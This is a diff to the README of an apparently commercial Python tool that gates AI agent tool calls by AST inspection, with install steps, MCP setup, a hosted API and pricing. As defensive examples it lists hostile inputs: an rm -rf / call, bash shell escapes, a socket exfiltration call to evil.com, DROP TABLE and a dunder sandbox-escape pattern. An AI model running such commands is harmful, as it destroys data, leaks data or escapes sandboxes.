@@ -51,16 +51,16 @@ uvx aw1-circuit-breaker verify "subprocess.run(['rm', '-rf', '/'])"
 ## 📦 Installation
 
 ```bash
-pip install aw1-circuit-breaker
+pip install --upgrade aw1-circuit-breaker
 ```
 
 *(Zero external dependencies. Pure Python standard library: Python 3.10 to 3.13).*
 
 ---
 
-## 🛡️ Enterprise Guard (Turnkey 3-Line Integration)
+## 🛡️ Enterprise Guard (Turnkey Integration)
 
-Drop enterprise boundary policies directly onto agent tools using the `@guard.protect` decorator:
+Drop enterprise boundary policies directly onto agent tools using the `@guard.protect` or universal `@guard` adapter:
 
 ```python
 from aw1 import EnterpriseGuard, SecurityViolationError
@@ -79,8 +79,18 @@ def execute_database_query(query: str):
 # Benign queries execute instantly (< 0.2ms)
 execute_database_query("SELECT id FROM users LIMIT 1;")
 
-# Adversarial AST injections & SQL drops are halted deterministically
+# Adversarial AST injections & SQL drops are halted deterministically:
 # -> Raises SecurityViolationError: "Database mutation rejected under readonly_sql policy"
+```
+
+### Universal Function & Async Gating
+
+```python
+from aw1 import guard
+
+@guard
+async def run_agent_tool(tool_payload: dict) -> dict:
+    return {"status": "ok"}
 ```
 
 ---
@@ -96,7 +106,7 @@ python mcp_server.py
 Or via `uvx`:
 
 ```bash
-uvx mcp_server.py
+uvx aw1-circuit-breaker
 ```
 
 ### MCP Client Configuration
@@ -107,8 +117,8 @@ Add to your Claude Desktop or Cursor configuration:
 {
   "mcpServers": {
     "aw1-circuit-breaker": {
-      "command": "python",
-      "args": ["mcp_server.py"]
+      "command": "uvx",
+      "args": ["aw1-circuit-breaker"]
     }
   }
 }
@@ -128,6 +138,7 @@ AW-1 operates deterministically at the Abstract Syntax Tree (AST) level before c
 | **Shell Escapes** | `subprocess.Popen(['bash', ...])` | Masked as system task | 🛑 **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |
 | **Lateral Exfiltration** | `socket.connect(('evil.com', 443))` | Disguised as HTTP fetch | 🛑 **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |
 | **SQL Destruction** | `DROP TABLE users;` | Prompt jailbreak bypass | 🛑 **Tripped (`HALT_SQL_MUTATION_FORBIDDEN`)** |
+| **Dunder Introspection** | `().__class__.__subclasses__()` | Bypasses keyword filters | 🛑 **Tripped (`FAIL_CLOSED_REFLECTION_BREACH`)** |
 
 ### Run the Showcase
 
@@ -173,42 +184,13 @@ except CircuitBreakerException as blocked:
 
 ---
 
-## 🌐 Production Cloud API & Quota Upgrades
-
-Deploying autonomous agents in production? Route your tool dispatch loops through our hosted API gateway with sub-0.2ms deterministic AST inspection:
-
-| Plan | Pricing (USD / BWP) | Quota & Features | Access / Checkout |
-| :--- | :--- | :--- | :--- |
-| **Developer Sandbox** | Free | 10,000 requests, HMAC token minting | Code `HOL-BREAKER-2026` |
-| **Developer Pro** | $49 / BWP 650 /mo | 100,000 audit requests, 1 license key, offline HMAC validation | [Upgrade to Pro](https://laveto-wisdom.lemonsqueezy.com/checkout) |
-| **Team / Startup** | $199 / BWP 2,650 /mo | 1,000,000 audit requests, 5 seat keys, Redis state sync | [Upgrade to Team](https://laveto-wisdom.lemonsqueezy.com/checkout) |
-| **Enterprise Dedicated** | $990 / BWP 13,200 /mo | Unlimited seats, dedicated gateway tenant, custom statutory lenses | [Enterprise Desk](https://p20.laveto.net/wisdom/tender-portal) |
-
-To activate enterprise quotas, pass your signed bearer token in the `Authorization` header:
-
-```bash
-curl -X POST [https://p20.laveto.net/wisdom/api/v1/intercept](https://p20.laveto.net/wisdom/api/v1/intercept) \
-  -H "Authorization: Bearer AW1-EXEC-TOKEN-..." \
-  -H "Content-Type: application/json" \
-  -d '{"actor_id": "prod-agent-01", "tool_name": "db_query", "payload": "SELECT 1;"}'
-```
-
----
-
-## License
-
-Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0). See [LICENSE](LICENSE) for details.
-
-
----
-
-## 🌐 Cloud REST API Gateway
+## 🌐 Cloud REST API Gateway & Production Quotas
 
 The AW-1 Circuit Breaker provides a production-grade HTTP interception gateway for microservices, browser frontends, and autonomous agent platforms.
 
-* **Endpoint:** `POST [https://p20.laveto.net/wisdom/api/v1/intercept](https://p20.laveto.net/wisdom/api/v1/intercept)`
-* **CORS:** Enabled (`Access-Control-Allow-Origin: *`)
-* **Arbitration Engine Latency:** `< 0.80 ms`
+- **Endpoint:** `POST https://p20.laveto.net/wisdom/api/v1/intercept`
+- **CORS:** Enabled (`Access-Control-Allow-Origin: *`)
+- **Arbitration Engine Latency:** `< 0.80 ms`
 
 ### Request Payload
 
@@ -251,3 +233,27 @@ The AW-1 Circuit Breaker provides a production-grade HTTP interception gateway f
   "circuit_breaker": "AW-1 Sovereign Execution Arbitrator"
 }
 ```
+
+### Production Quotas & Pricing
+
+| Plan | Pricing (USD / BWP) | Quota & Features | Access / Checkout |
+| :--- | :--- | :--- | :--- |
+| **Developer Sandbox** | Free | 10,000 requests, HMAC token minting | Code `HOL-BREAKER-2026` |
+| **Developer Pro** | $49 / BWP 650 /mo | 100,000 audit requests, 1 license key, offline HMAC validation | [Upgrade to Pro](https://laveto-wisdom.lemonsqueezy.com/checkout) |
+| **Team / Startup** | $199 / BWP 2,650 /mo | 1,000,000 audit requests, 5 seat keys, Redis state sync | [Upgrade to Team](https://laveto-wisdom.lemonsqueezy.com/checkout) |
+| **Enterprise Dedicated** | $990 / BWP 13,200 /mo | Unlimited seats, dedicated gateway tenant, custom statutory lenses | [Enterprise Desk](https://p20.laveto.net/wisdom/tender-portal) |
+
+To activate enterprise quotas, pass your signed bearer token in the `Authorization` header:
+
+```bash
+curl -X POST [https://p20.laveto.net/wisdom/api/v1/intercept](https://p20.laveto.net/wisdom/api/v1/intercept) \
+  -H "Authorization: Bearer AW1-EXEC-TOKEN-..." \
+  -H "Content-Type: application/json" \
+  -d '{"actor_id": "prod-agent-01", "tool_name": "db_query", "payload": "SELECT 1;"}'
+```
+
+---
+
+## License
+
+Licensed under the [Apache License, Version 2.0](LICENSE). See [LICENSE](LICENSE) for details.
